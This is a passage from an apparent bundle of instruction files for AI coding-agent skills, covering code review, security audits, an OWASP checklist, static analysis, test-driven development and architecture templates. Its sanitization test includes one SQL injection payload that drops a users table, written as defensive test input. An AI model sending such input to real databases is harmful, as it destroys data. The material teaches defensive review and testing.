**Fix**: Add admin role check before processing\n\n## Warning Issues\n\n### [WARNING] Unhandled Promise Rejection\n- **File**: `src/services/auth.ts:78`\n- **Category**: correctness\n- **Description**: Async function lacks error handling\n- **Fix**: Wrap in try/catch or add .catch()\n\n### [WARNING] N+1 Query Pattern\n- **File**: `src/api/posts.ts:56`\n- **Category**: performance\n- **Description**: DB query inside loop will cause performance issues\n- **Fix**: Use JOIN or batch loading\n\n## Nit Picks\n\n### [NIT] Inconsistent Naming\n- **File**: `src/utils/helpers.ts`\n- **Category**: style\n- **Description**: Function uses camelCase but exports as snake_case\n- **Fix**: Align naming conventions\n\n## Static Analysis Results\n- ESLint: 2 new warnings (see above)\n- TypeScript: No type errors\n- npm audit: 1 high vulnerability (lodash@4.17.15)\n\n## Approval Status\n**Changes Requested** - Please address critical and warning issues\n```\n\n## Success Criteria\n- [ ] Report is categorized by severity\n- [ ] Every finding includes a specific file:line reference\n- [ ] Every critical finding suggests a concrete fix\n- [ ] Security checklist verified\n- [ ] All affected files reviewed\n- [ ] Static analysis results included\n",
        "plugins/sys-builder/skills/applying-code-standards/references/security-audit.md": "# Workflow: Security Audit\n\n## Purpose\nSystematic scan for vulnerabilities using OWASP patterns.\n\n## Required Reading\n- `references/security-checklist.md`\n\n## Process\n\n### Step 1: Reconnaissance\nFind sensitive surface areas.\n```bash\ngrep -r \"password\" .\ngrep -r \"api_key\" .\ngrep -r \"eval(\" .\n```\n\n### Step 2: Data Flow Analysis\nTrace user input from Entry Point (API Controller) to Sink (Database/HTML).\n- Is it validated at entry?\n- Is it escaped at exit?\n\n### Step 3: Report\nCreate a confidential vulnerability report.\n- **Severity**: CVSS Score estimation.\n- **Exploit**: How it could be abused.\n- **Fix**: Code patch.\n\n## Success Criteria\n- [ ] All \"Critical\" inputs traced.\n- [ ] Report assumes \"Attacker Mindset\".",
        "plugins/sys-builder/skills/applying-code-standards/references/security-checklist.md": "# Security Checklist (OWASP Top 10)\n\n## A01:2021 - Broken Access Control\n- [ ] Authentication required for all sensitive endpoints\n- [ ] Authorization checks on every protected resource\n- [ ] No direct object references without validation\n- [ ] Session management properly implemented\n- [ ] Role-based access control (RBAC) enforced\n\n## A02:2021 - Cryptographic Failures\n- [ ] Data encrypted in transit (TLS/SSL)\n- [ ] Data encrypted at rest\n- [ ] Strong encryption algorithms used (AES-256, RSA-2048+)\n- [ ] Cryptographic keys properly secured\n- [ ] No hardcoded passwords or keys\n\n## A03:2021 - Injection\n- [ ] All user inputs parameterized/prepared statements\n- [ ] No dynamic SQL queries\n- [ ] Input validation on all entry points\n- [ ] Output encoding/escaping implemented\n- [ ] Command injection prevention (no eval(), exec())\n\n## A04:2021 - Insecure Design\n- [ ] Threat modeling completed\n- [ ] Security requirements defined\n- [ ] Secure architecture patterns followed\n- [ ] Defense in depth implemented\n- [ ] Security controls fail securely\n\n## A05:2021 - Security Misconfiguration\n- [ ] Default accounts/passwords changed\n- [ ] Unnecessary features disabled\n- [ ] Security headers configured (CSP, HSTS, X-Frame-Options)\n- [ ] Error messages don't expose sensitive info\n- [ ] Security updates applied\n\n## A06:2021 - Vulnerable and Outdated Components\n- [ ] Dependencies regularly updated\n- [ ] Vulnerability scanning implemented\n- [ ] No deprecated libraries in use\n- [ ] Component versions tracked\n- [ ] Security advisories monitored\n\n## A07:2021 - Identification and Authentication Failures\n- [ ] Multi-factor authentication (MFA) where appropriate\n- [ ] Strong password policies enforced\n- [ ] Account lockout after failed attempts\n- [ ] Session timeouts implemented\n- [ ] No session fixation vulnerabilities\n\n## A08:2021 - Software and Data Integrity Failures\n- [ ] Code signed and verified\n- [ ] Integrity checks on updates\n- [ ] No unsigned/unaltered plugins\n- [ ] Secure CI/CD pipeline\n- [ ] Dependencies pinned and verified\n\n## A09:2021 - Security Logging and Monitoring Failures\n- [ ] Security events logged (auth failures, access attempts)\n- [ ] Logs protected from tampering\n- [ ] Monitoring/alerting configured\n- [ ] Log retention policy defined\n- [ ] Regular log review process\n\n## A10:2021 - Server-Side Request Forgery (SSRF)\n- [ ] URL validation on external requests\n- [ ] Network segmentation implemented\n- [ ] Allowlist of approved URLs/domains\n- [ ] Response validation implemented\n- [ ] Metadata protection enabled\n\n## Additional Security Checks\n\n### Input Validation\n- [ ] Length limits enforced\n- [ ] Type checking implemented\n- [ ] Range/format validation\n- [ ] Canonicalization performed\n- [ ] Reject unexpected input\n\n### Output Security\n- [ ] HTML encoding for web output\n- [ ] SQL escaping for database\n- [ ] Command escaping for shell\n- [ ] URL encoding for links\n- [ ] JSON/XML encoding\n\n### Authentication & Authorization\n- [ ] Password hashing (bcrypt, Argon2)\n- [ ] Secure session tokens\n- [ ] OAuth/OpenID properly configured\n- [ ] JWT tokens properly secured\n- [ ] API keys rotated regularly\n\n### Data Protection\n- [ ] PII encrypted\n- [ ] Data minimization applied\n- [ ] Secure data disposal\n- [ ] Backup encryption\n- [ ] Privacy controls implemented\n\n## Severity Levels\n\n**Critical (Must Fix)**\n- Authentication/authorization bypasses\n- SQL injection vulnerabilities\n- Remote code execution\n- Direct object reference flaws\n\n**High (Fix Soon)**\n- XSS vulnerabilities\n- CSRF protection missing\n- Cryptographic weaknesses\n- Insecure deserialization\n\n**Medium (Plan to Fix)**\n- Information disclosure\n- Missing security headers\n- Weak session management\n- Insecure configurations\n\n**Low (Monitor)**\n- Verbose error messages\n- Missing rate limiting\n- Weak password policies\n- Outdated dependencies\n",
        "plugins/sys-builder/skills/applying-code-standards/references/static-analysis-workflow.md": "# Static Analysis Workflow\n\n## Core Purpose\n\nAutomated code quality and security analysis using static application security testing (SAST) tools and language-specific linters. Focus on detecting vulnerabilities, code smells, and maintainability issues before runtime.\n\n## Analysis Protocol\n\n### Phase 1: Tool Selection\n\n**Language-specific tools:**\n| Language | Recommended Tools | Command |\n|----------|-------------------|---------|\n| **TypeScript/JavaScript** | ESLint, TypeScript Compiler, SonarJS | `eslint .`, `tsc --noEmit` |\n| **Python** | Ruff, Pylint, Bandit, MyPy | `ruff check .`, `bandit -r .` |\n| **Go** | golangci-lint, go vet, staticcheck | `golangci-lint run` |\n| **Rust** | Clippy, rustfmt | `cargo clippy` |\n| **Java** | SpotBugs, Checkstyle, PMD | `mvn spotbugs:check` |\n\n**Security-focused tools:**\n- **Semgrep**: Rule-based static analysis for multiple languages\n- **CodeQL**: Semantic code analysis engine (GitHub)\n- **Trivy**: Security scanner for dependencies and code\n\n### Phase 2: Run Analysis\n\n#### Step 1: Dependency Security Scan\n```bash\n# npm (JavaScript)\nnpm audit\n# or\npnpm audit\n\n# pip (Python)\npip-audit\n# or\nsafety check\n\n# go (Go)\ngo list -json -m all | nancy sleuth\n\n# cargo (Rust)\ncargo audit\n```\n\n#### Step 2: Code Quality Linting\n```bash\n# TypeScript/JavaScript\neslint . --ext .ts,.tsx,.js,.jsx --format json --output-file eslint-report.json\n\n# Python\nruff check . --output-format json > ruff-report.json\n\n# Go\ngolangci-lint run --out-format json > golangci-report.json\n```\n\n#### Step 3: Type Safety Check\n```bash\n# TypeScript\ntsc --noEmit\n\n# Python (with mypy)\nmypy . --json-report mypy-report/\n\n# Go (built-in)\ngo vet ./...\n```\n\n#### Step 4: Security Scan\n```bash\n# Semgrep (multi-language)\nsemgrep --config=auto --json --output=semgrep-report.json\n\n# Bandit (Python security)\nbandit -r . -f json -o bandit-report.json\n\n# Trivy (filesystem scan)\ntrivy fs --format json --output trivy-report.json .\n```\n\n### Phase 3: Analyze Results\n\n#### Severity Classification\n\n**Critical (Must Fix):**\n- SQL Injection, Command Injection, XSS vulnerabilities\n- Hardcoded credentials or API keys\n- Insecure cryptographic algorithms\n- Authentication/authorization bypasses\n- Remote code execution (RCE) vectors\n\n**High (Should Fix):**\n- Dependency vulnerabilities with known exploits\n- Unsanitized user input\n- Sensitive data exposure in logs\n- Race conditions\n- Memory leaks (resource exhaustion)\n\n**Medium (Consider Fixing):**\n- Code complexity violations\n- Code smells (duplicate code, long functions)\n- Deprecated API usage\n- Performance anti-patterns\n\n**Low (Technical Debt):**\n- Style inconsistencies\n- Missing documentation\n- Weak typing issues\n\n### Phase 4: Report Findings\n\n#### Report Template\n\n```markdown\n# Static Analysis Report\n\n## Summary\n- **Tool**: [Tool Name]\n- **Files Scanned**: N\n- **Issues Found**: N (Critical: N, High: N, Medium: N, Low: N)\n- **Date**: [Timestamp]\n\n## Critical Issues\n### [CWE-XXX] Issue Title\n- **File**: `path/to/file.ts:123`\n- **Tool**: [Tool Name]\n- **Description**: Clear explanation of the vulnerability\n- **Remediation**: Specific code example showing the fix\n- **References**: [CWE Link] | [Documentation]\n\n## High Issues\n[Same format as above]\n\n## Dependency Vulnerabilities\n| Package | Version | Vulnerability | Severity | Fix Version |\n|---------|---------|---------------|----------|-------------|\n| package-name | 1.2.3 | CVE-2024-XXXX | High | 1.2.4 |\n\n## Code Quality Metrics\n- **Cyclomatic Complexity**: Average X.X (Max: Y)\n- **Code Duplication**: X%\n- **Test Coverage**: X%\n- **Technical Debt Ratio**: X hours\n\n## Recommendations\n1. Prioritized list of remediation steps\n2. Suggested tool configurations\n3. Process improvements (CI/CD integration)\n```\n\n### Phase 5: Remediation\n\n#### Automated Fixes\n```bash\n# ESLint auto-fix\neslint . --fix\n\n# Ruff auto-fix (Python)\nruff check . --fix\n\n# Black formatter (Python)\nblack .\n\n# gofmt (Go)\ngofmt -w .\n```\n\n#### Manual Fixes\n\nFor each critical/high issue:\n1. Understand the root cause\n2. Reference CWE/Owasp documentation\n3. Implement fix following secure coding practices\n4. Add regression test\n5. Re-scan to verify fix\n\n## CI/CD Integration\n\n### GitHub Actions Example\n\n```yaml\nname: Static Analysis\n\non: [push, pull_request]\n\njobs:\n  security-scan:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run Semgrep\n        uses: returntocorp/semgrep-action@v1\n        with:\n          config: auto\n\n      - name: Run Trivy\n        uses: aquasecurity/trivy-action@master\n        with:\n          scan-type: 'fs'\n          scan-ref: '.'\n          format: 'sarif'\n          output: 'trivy-results.sarif'\n\n      - name: Upload SARIF files\n        uses: github/codeql-action/upload-sarif@v2\n        with:\n          sarif_file: 'trivy-results.sarif'\n```\n\n### Pre-commit Hook\n\n```bash\n# .git/hooks/pre-commit\n#!/bin/bash\n\necho \"Running static analysis...\"\n\n# Run linter\nif ! ruff check .; then\n    echo \"Linting failed. Run 'ruff check . --fix' to auto-fix.\"\n    exit 1\nfi\n\n# Run type checker\nif ! mypy .; then\n    echo \"Type checking failed.\"\n    exit 1\nfi\n\n# Run security scanner\nif ! bandit -r . -ll; then\n    echo \"Security issues detected.\"\n    exit 1\nfi\n\necho \"All checks passed!\"\n```\n\n## Best Practices\n\n1. **Shift Left**: Run analysis during development, not just in CI\n2. **Fail Fast**: Configure CI to fail on critical/high issues\n3. **False Positives**: Maintain suppression files with justification\n4. **Baseline**: Establish initial baseline, then enforce zero new issues\n5. **Fix Timeboxes**: Set SLAs for critical (24h), high (1 week), medium (1 month)\n\n## Anti-Patterns to Avoid\n\n- BAD Ignoring tool outputs without review\n- BAD Over-suppressing warnings (reduces tool effectiveness)\n- BAD Running analysis manually only (automate in CI)\n- BAD Using tools without custom rules for your domain\n- BAD Treating all findings equally (prioritize by risk)\n\n## Success Criteria\n\n- [ ] All critical vulnerabilities remediated or documented with risk acceptance\n- [ ] Dependency vulnerabilities addressed or updated\n- [ ] Code quality metrics maintained or improved\n- [ ] Analysis integrated into CI/CD pipeline\n- [ ] Team trained on interpreting and fixing findings\n- [ ] False positive rate < 10%\n",
        "plugins/sys-builder/skills/applying-code-standards/references/tdd-protocol.md": "# Test-Driven Development Protocol\n\n## The Iron Law\n\n**NO PRODUCTION CODE WITHOUT A FAILING TEST FIRST**\n\nWrite code before the test? Delete it. Start over.\n\n**No exceptions:**\n- Don't keep it as \"reference\"\n- Don't \"adapt\" it while writing tests\n- Don't look at it\n- Delete means delete\n\nImplement fresh from tests. Period.\n\n## Red-Green-Refactor Cycle\n\n```dot\ndigraph tdd_cycle {\n    rankdir=TB;\n    RED [shape=circle, style=filled, fillcolor=red, label=\"RED\\nWrite failing test\"];\n    GREEN [shape=circle, style=filled, fillcolor=green, label=\"GREEN\\nWrite minimal code\"];\n    REFACTOR [shape=circle, style=filled, fillcolor=lightblue, label=\"REFACTOR\\nClean up code\"];\n\n    RED -> GREEN [label=\"Write minimal code\"];\n    GREEN -> REFACTOR [label=\"Clean up code\"];\n    REFACTOR -> RED [label=\"Next feature\"];\n}\n```\n\n### RED Phase: Write a Failing Test\n\n1. **Write a test for the next piece of functionality**\n   - Be specific about what you're testing\n   - Test one thing at a time\n   - Make it fail (it should - the feature doesn't exist yet)\n\n2. **Run the test to verify it fails**\n   - If it doesn't fail, your test isn't testing anything\n   - Fix the test before proceeding\n   - Watch it fail for the right reason\n\n3. **Only when the test fails for the right reason can you proceed**\n\n### GREEN Phase: Write Minimal Code\n\n1. **Write the minimal code to make the test pass**\n   - Don't write extra code\n   - Don't write \"better\" code\n   - Just enough to pass the test\n\n2. **Run the test to verify it passes**\n   - If it doesn't pass, adjust the implementation\n   - Keep it simple\n   - Only do what the test requires\n\n3. **Your code is allowed to be ugly at this point**\n\n### REFACTOR Phase: Clean Up\n\n1. **Now you can improve the code**\n   - Clean up naming\n   - Remove duplication\n   - Improve structure\n   - But ONLY while tests pass\n\n2. **Run tests to verify refactoring doesn't break anything**\n   - Tests are your safety net\n   - If refactoring breaks tests, undo it\n\n3. **Commit after successful refactoring**\n\n## Test Writing Guidelines\n\n### AAA Pattern\n\n```\nArrange: Set up the test data and environment\nAct: Execute the code under test\nAssert: Verify the result\n```\n\n### Good Tests Are:\n\n1. **Independent** - Don't rely on other tests\n2. **Repeatable** - Run multiple times, same result\n3. **Fast** - Complete in milliseconds\n4. **Specific** - Test one thing at a time\n5. **Clear** - Easy to understand what they're testing\n\n### Test Naming\n\n```python\ndef test_specific_behavior():\n    \"\"\"Test should describe WHAT is being tested\"\"\"\n\n# Good examples:\ndef test_add_two_positive_numbers():\ndef test_user_cannot_checkout_with_empty_cart():\ndef test_parser_handles_empty_input():\ndef test_database_connection_retry_on_failure():\n```\n\n## Red Flags\n\n**Never:**\n- Write implementation code before tests\n- Keep implementation code as \"reference\" when writing tests\n- Look at existing implementation while writing tests\n- Write tests that don't fail initially\n- Skip tests because \"it's obvious\"\n- Write multiple tests that all pass immediately\n- Skip the refactoring phase\n\n**If you accidentally write implementation first:**\n- DELETE IT ALL\n- Start over with tests\n- No exceptions\n\n**If tests don't fail initially:**\n- Check if test is actually testing what you think\n- Verify the feature doesn't already exist\n- Fix the test before proceeding\n\n**If you can't write a test:**\n- The feature is too big (break it down)\n- You don't understand the requirement (ask questions)\n- The design is unclear (sketch it out first)\n\n## Implementation Patterns\n\n### For New Features\n\n```\n1. Write test for the feature\n2. Run test  fails (RED)\n3. Write minimal implementation\n4. Run test  passes (GREEN)\n5. Refactor code (REFACTOR)\n6. Repeat for next feature\n```\n\n### For Bug Fixes\n\n```\n1. Write test that reproduces the bug\n2. Run test  fails (RED)\n3. Fix the bug with minimal change\n4. Run test  passes (GREEN)\n5. Refactor if needed (REFACTOR)\n6. Verify no regressions with existing tests\n```\n\n### For Refactoring\n\n```\n1. Write tests for current behavior (if missing)\n2. Run tests  all pass (GREEN)\n3. Refactor code\n4. Run tests  still pass (REFACTOR)\n5. If tests fail, undo refactoring\n```\n\n## Benefits of TDD\n\n1. **Better Design** - Tests force you to think about API first\n2. **Fewer Bugs** - Code is verified from day one\n3. **Living Documentation** - Tests show how code works\n4. **Confidence** - Fearless refactoring with test safety net\n5. **Less Debugging** - Find issues immediately\n6. **Cleaner Code** - Minimal code that does exactly what's needed\n",
        "plugins/sys-builder/skills/applying-code-standards/references/test-driven-development.md": "# Workflow: Test-Driven Development\n\n## Purpose\nImplement features and bug fixes using the Red-Green-Refactor cycle. Write tests first, watch them fail, write minimal code to pass, then refactor while tests remain green.\n\n## Required Reading\n- `references/tdd-protocol.md` - The Iron Law and Red-Green-Refactor methodology\n\n## When to Use TDD\n\n**Always use TDD for:**\n- New features\n- Bug fixes\n- Refactoring\n- Behavior changes\n\n**Exceptions:**\n- Throwaway prototypes\n- Generated code\n- Configuration files\n\n## Process\n\n### Step 1: Define the Feature\nBe specific about what you're implementing:\n- Write a clear description of the feature/bug\n- Break down into smallest testable unit\n\n### Step 2: RED - Write a Failing Test\n\n1. **Write the test**\n   ```python\n   def test_specific_behavior():\n       # Arrange\n       setup_test_data()\n\n       # Act\n       result = function_under_test()\n\n       # Assert\n       assert result == expected_value\n   ```\n\n2. **Run the test to verify it fails**\n   ```bash\n   pytest test_file.py::test_specific_behavior\n   ```\n\n3. **Confirm failure is expected**\n   - Should fail because feature doesn't exist yet\n   - If it passes, fix the test\n   - If it fails for wrong reason, fix the test\n\n**CRITICAL:** You must see the test fail for the right reason before proceeding.\n\n### Step 3: GREEN - Write Minimal Code\n\n1. **Write ONLY what's needed to pass the test**\n   ```python\n   def function_under_test():\n       return expected_value  # Hard-coded is okay!\n   ```\n\n2. **Run the test**\n   ```bash\n   pytest test_file.py::test_specific_behavior\n   ```\n\n3. **Verify it passes**\n   - Don't add extra features\n   - Don't optimize\n   - Just make the test pass\n\n### Step 4: REFACTOR - Clean Up\n\n1. **Improve the code while tests pass**\n   - Fix naming\n   - Remove duplication\n   - Improve structure\n   - Add better algorithms\n\n2. **Run tests frequently**\n   ```bash\n   pytest test_file.py\n   ```\n\n3. **If tests break, undo changes**\n   - Tests are your safety net\n   - Revert and try different approach\n\n### Step 5: Repeat for Next Feature\n\n1. **Write next failing test**\n2. **Make it pass with minimal code**\n3. **Refactor while green**\n4. **Continue until feature complete**\n\n## TDD for Bug Fixes\n\n### Pattern: Write Reproduction Test\n\n1. **Write test that reproduces the bug**\n   ```python\n   def test_bug_description():\n       # Set up conditions that trigger bug\n       buggy_input = create_buggy_input()\n\n       # Execute\n       result = function_under_test(buggy_input)\n\n       # Assert on expected (correct) behavior\n       assert result != buggy_behavior  # Bug produces wrong result\n       assert result == correct_behavior  # Should produce this instead\n   ```\n\n2. **Run test  fails (RED)** - Confirms bug exists\n\n3. **Fix with minimal change**\n   ```python\n   def function_under_test(input):\n       # Add minimal fix\n       if input == buggy_condition:\n           return correct_behavior\n       # ... rest of code\n   ```\n\n4. **Run test  passes (GREEN)** - Bug is fixed\n\n5. **Run full test suite** - Verify no regressions\n\n## Example: Building a Calculator\n\n### Test 1: Addition\n```python\ndef test_calculator_adds_two_numbers():\n    calc = Calculator()\n    result = calc.add(2, 3)\n    assert result == 5\n```\n\n**Run test  Fails** (Calculator doesn't exist)\n\n**Minimal implementation:**\n```python\nclass Calculator:\n    def add(self, a, b):\n        return 5\n```\n\n**Run test  Passes**\n\n### Test 2: Subtraction\n```python\ndef test_calculator_subtracts_two_numbers():\n    calc = Calculator()\n    result = calc.subtract(5, 3)\n    assert result == 2\n```\n\n**Run test  Fails** (no subtract method)\n\n**Minimal implementation:**\n```python\nclass Calculator:\n    def add(self, a, b):\n        return a + b  # Refactored from hard-coded\n\n    def subtract(self, a, b):\n        return 2  # Hard-coded\n```\n\n**Run test  Passes**\n\n### Continue for multiply, divide...\n\n### Refactoring Phase\nAfter all basic operations work:\n```python\nclass Calculator:\n    def add(self, a, b):\n        return a + b\n\n    def subtract(self, a, b):\n        return a - b\n\n    def multiply(self, a, b):\n        return a * b\n\n    def divide(self, a, b):\n        return a / b\n```\n\n## Success Criteria\n\n- [ ] Every new function/method has a test\n- [ ] Watched each test fail before implementing\n- [ ] Each test failed for expected reason (feature missing, not typo)\n- [ ] Wrote minimal code to pass each test\n- [ ] All tests pass\n- [ ] Code is refactored while tests remain green\n- [ ] Output pristine (no errors, warnings)\n\nCan't check all boxes? You skipped TDD. Start over.\n\n## Common Mistakes\n\n### Writing Code First\n**Mistake:** Implementing function before writing test\n**Solution:** DELETE THE CODE. Write test first.\n\n### Test Passes Immediately\n**Mistake:** Test passes without implementation\n**Reason:** Feature already exists or test is wrong\n**Solution:** Fix test to actually test missing functionality\n\n### Too Much Implementation\n**Mistake:** Adding extra features in GREEN phase\n**Solution:** Only write code needed to pass the test\n\n### Skipping Refactor\n**Mistake:** Leaving ugly hard-coded solutions\n**Solution:** Refactor while tests are green\n\n## Integration with Engineering Workflows\n\n### With Debugging\nBug found? Write failing test first, then fix using debug protocol.\n\n### With Code Review\nSubmit PRs with:\n- All tests pass\n- TDD approach documented\n- Refactoring completed\n\n### With Security\nWrite tests for security requirements:\n```python\ndef test_sql_injection_prevented():\n    malicious_input = \"'; DROP TABLE users; --\"\n    result = query_database(malicious_input)\n    assert \"DROP TABLE\" not in result\n    assert result is sanitized\n```\n\n### With Refactoring\nBefore refactoring:\n1. Write tests for current behavior\n2. Ensure all tests pass (GREEN)\n3. Refactor code\n4. Verify tests still pass (REFACTOR)\n\n## Tools and Commands\n\n### Quick Test Run\n```bash\npytest test_file.py -v\n```\n\n### Watch Tests\n```bash\npytest-watch test_file.py  # Reruns on file change\n```\n\n### Test Coverage\n```bash\npytest --cov=module test_file.py\n```\n\n## Remember\n\n**The Iron Law is non-negotiable:**\n- Write test first\n- Watch it fail\n- Write minimal code\n- Refactor while green\n- Repeat\n\nViolate the rules, and you violate the spirit of TDD.\n",
        "plugins/sys-builder/skills/designing-architecture/SKILL.md": "---\nname: designing-architecture\ndescription: \"Applies system architecture and design frameworks for software systems. Provides discovery protocols, system design workflows, architecture decision records (ADRs), and quality evaluation criteria. PROACTIVELY Use when designing new systems, analyzing existing architecture, or making architectural decisions. Do not use for project plan state management, task execution, or phase coordination  see managing-plans skill.\"\nallowed-tools: [Read, Write, Edit, Glob, Grep, TodoWrite]\n---\n\n# Architecture Design & Analysis\n\n\n\n## Protocol Reference Index\n\n### Discovery & Analysis\n- **Protocol**: `references/discovery.md` - Deep discovery workflow (Context Mapping, Requirements, Environment)\n- **Protocol**: `references/codebase-discovery.md` - Quick codebase exploration\n- **Reference**: `references/quality-checklist.md` - Quality evaluation checklist\n- **When to Apply**: MANDATORY before starting any design or analysis task to ensure 100% clarity.\n\n### System Design (Greenfield)\n- **Protocol**: `references/system-design.md` - Complete system design workflow\n- **When to Apply**: New systems, major features, technology selection\n\n### Architecture Patterns\n- **Reference**: `references/architecture-patterns.md` - Design patterns guide\n- **When to Apply**: Selecting patterns based on requirements\n\n### Architecture Decision Records\n- **Template**: `references/adr-template.md` - ADR template and documentation standards\n- **When to Apply**: Documenting significant architectural decisions\n\n**ADR Creation Protocol:**\n1. **Auto-increment**: Count existing ADR entries and add 1\n2. **Append**: Add to bottom of ADR.md (never delete or modify old entries)\n3. **File location**: `.cattoolkit/plan/{project-slug}/ADR.md`\n4. **Numbering**: Sequential (ADR-001, ADR-002, etc.)\n5. **Append-Only Rule**: Never delete, modify, or reorder entries\n\n**When to Create ADR:**\n- Technology stack changes (frameworks, databases)\n- Major architectural patterns (auth strategy, state management)\n- Breaking API changes (protocol changes, data format changes)\n- Infrastructure additions (caching, message queues)\n- Significant refactors (directory structure, module organization)\n\n## Workflow Selection\n\n**Protocol Chain:**\n1. **Discovery**: ALWAYS start with `references/discovery.md` to gather context.\n2. **Analysis/Design**: Based on discovery results:\n   - **Greenfield (New System)**: Follow `references/system-design.md`.\n   - **Brownfield (Existing System)**: Perform mapping and refactoring analysis.\n3. **Documentation**: Document all outcomes with ADRs and diagrams.\n\n## Quality Criteria\n\nEvery architecture must address specific quality gates. For the comprehensive evaluation checklist, see `references/quality-checklist.md`.\n\n**Note**: For project plan state management and task execution, use `managing-plans` skill.\n",
        "plugins/sys-builder/skills/designing-architecture/references/adr-template.md": "# ADR Template: Architecture Decision Record\n\nFor each significant architectural decision, document using the following structure:\n\n# ADR-{NUMBER}: {TITLE}\n\n## Status\n\n{ACCEPTED/SUPERSEDED/DEPRECATED}\n\n## Context\n\nWhat is the issue, motivation, or decision being made? Provide background info and current state.\n\n## Decision\n\nWhat is the change being made? Explain the rationale and how it addresses the context.\n\n## Options Considered\n\n1. **{OPTION_1}**: {Description}\n   - Pros: {Advantage 1}\n   - Cons: {Disadvantage 1}\n\n2. **{OPTION_2}**: {Description}\n   - Pros: {Advantage 2}\n   - Cons: {Disadvantage 2}\n\n## Consequences\n\n**Positive:**\n- {Positive outcome 1}\n\n**Negative:**\n- {Negative outcome 1}\n\n**Neutral:**\n- {Neutral outcome 1}\n\n## Date\n\n{DATE}\n\n## Decision Makers\n\n{WHO_MADE_DECISION}\n\n## Implementation\n- [ ] Tasks to implement this decision\n- [ ] Timeline\n- [ ] Owner\n",
        "plugins/sys-builder/skills/designing-architecture/references/architecture-patterns.md": "# Architecture Patterns\n\n## Breaking Down Work\n**Principle:** Tasks should be atomic, verifiable, and independent.\n\n### Granularity Guide\n- **Too Big:** \"Build the backend\" (Takes > 3 hours)\n- **Too Small:** \"Fix typo in comment\" (Combine with others)\n- **Just Right:** \"Implement User Auth API endpoints\" (30-90 mins)\n\n## Phase Structure Pattern\n1.  **Foundation:** Scaffolding, deps, env setup.\n2.  **Core:** Primary logic and \"Happy Path\".\n3.  **Enhancement:** Error handling, edge cases, logging.\n4.  **Polish:** UI tweaks, cleanup, documentation.\n\n## Dependency Rules\n- No circular dependencies.\n- Foundation must precede Core.\n- Updates to `ROADMAP.md` must reflect these dependencies.\n",
        "plugins/sys-builder/skills/designing-architecture/references/codebase-discovery.md": "# Discovery Protocol\n\n**Goal:** Understand the existing codebase structure before planning.\n\n## 1. Scan Structure\nUse `find` and `glob` to map the territory.\n```bash\nfind . -type f -not -path '*/.*' -maxdepth 3\n```\n\n## 2. Analyze Capabilities\n- **Dependencies:** Read `package.json`, `pyproject.toml`, etc.\n- **Frameworks:** Identify primary frameworks (Next.js, Django, etc.).\n- **Patterns:** Grep for `class`, `function` to see coding style.\n\n## 3. Assess Health\n- Check for tests.\n- Look for existing documentation (`README.md`).\n- Identify obviously broken or legacy code.\n",
        "plugins/sys-builder/skills/designing-architecture/references/discovery.md": "# Protocol: Architectural Deep Discovery\n\nThis protocol defines the standard for gathering context before performing system design or architecture analysis. It ensures agents have a complete understanding of the technical, business, and operational landscape.\n\n## Phase 1: Project Context Mapping\n\nGather essential project information to establish the baseline:\n\n### 1. Technology Stack\n- **Languages & Frameworks**: Identify core technologies in use.\n- **Data Stores**: Identify databases, caches, and message brokers.\n- **Infrastructure**: Identify cloud providers, container orchestration, and external services.\n- **Integrations**: Map external API dependencies and third-party services.\n\n### 2. Physical Structure\n- **Architecture Docs**: Locate `ADR` folders, `docs/architecture`, or similar.\n- **System Boundaries**: Identify modules, services, and clear separation points.\n- **Diagrams**: Search for C4, UML, or high-level architecture diagrams (SVG/Mermaid/PNG).\n- **Manifests**: Locate Kubernetes YAMLs, Terraform files, or deployment scripts.\n\n### 3. Business Context\n- **Domain**: Understand the core business problem.\n- **Requirements**: Locate product specs, user stories, or RFCs.\n- **Scale**: Identify current traffic (RPS), data volume (TB), and user count.\n- **Growth**: Identify 10x growth targets and timelines.\n\n## Phase 2: Requirements Analysis\n\nAnalyze the gathered context to define success criteria:\n\n### 1. Functional Requirements\n- List the MUST-HAVE features for the system.\n- Map the \"Happy Path\" data flow through the components.\n- Identify failure-critical integration points.\n\n### 2. Non-Functional Requirements (The Quality Gates)\n- **Scalability**: Define horizontal vs vertical scaling strategy for 10x loads.\n- **Reliability**: Define SLA/SLO requirements and fault-tolerance expectations.\n- **Security**: Define authentication, authorization, and encryption standards.\n- **Performance**: Define latency budgets for critical paths.\n- **Maintainability**: Identify technical debt that limits architectural evolution.\n\n## Phase 3: Environment Verification\n\nVerify the tools and access needed for implementation:\n- Ensure diagramming tools (Mermaid, D2, or SVG) are usable.\n- Verify access to existing architecture repositories.\n- Check for existing templates or standard ADR formats in the project.\n\n## Success Criteria Checklist\n- [ ] Task type classified (Greenfield vs Brownfield).\n- [ ] Tech stack mapped.\n- [ ] Project structure understood.\n- [ ] Requirements (Func/Non-Func) documented.\n- [ ] Constraints identified.\n",
        "plugins/sys-builder/skills/designing-architecture/references/quality-checklist.md": "# Architecture Quality Checklist\n\n## Design Principles\n\n### 1. Separation of Concerns\n- [ ] Is each component responsible for a single, well-defined functionality?\n- [ ] Are cross-cutting concerns (logging, security, error handling) properly abstracted?\n- [ ] Are UI, business logic, and data access layers separated?\n\n### 2. Loose Coupling\n- [ ] Do components depend on abstractions rather than concrete implementations?\n- [ ] Are dependencies injected rather than hard-coded?\n- [ ] Can components be modified independently?\n\n### 3. High Cohesion\n- [ ] Do related functionalities reside in the same component?\n- [ ] Are unrelated functionalities kept separate?\n- [ ] Is the component's purpose clear and focused?\n\n### 4. Reusability\n- [ ] Can components be reused in different contexts?\n- [ ] Are common patterns abstracted into reusable libraries?\n- [ ] Is the code DRY (Don't Repeat Yourself)?\n\n### 5. Open/Closed Principle\n- [ ] Can the system be extended without modifying existing code?\n- [ ] Are abstractions stable while implementations vary?\n- [ ] Are plugin/extension points available?\n\n## Architectural Quality Attributes\n\n### Scalability\n- [ ] **Horizontal Scaling**: Can services be scaled independently?\n- [ ] **Database Scaling**: Can data layer handle increased load?\n- [ ] **Stateless Design**: Are services designed to be stateless?\n- [ ] **Caching Strategy**: Is caching implemented at appropriate layers?\n- [ ] **Load Distribution**: Can load be distributed effectively?\n\n### Reliability\n- [ ] **Fault Tolerance**: How does the system handle component failures?\n- [ ] **Circuit Breakers**: Are external dependencies protected?\n- [ ] **Retry Logic**: Are transient failures handled gracefully?\n- [ ] **Graceful Degradation**: Can the system provide reduced functionality?\n- [ ] **Disaster Recovery**: What's the recovery plan and RTO/RPO?\n\n### Security\n- [ ] **Authentication**: How are users authenticated?\n- [ ] **Authorization**: How are permissions enforced?\n- [ ] **Data Protection**: Is 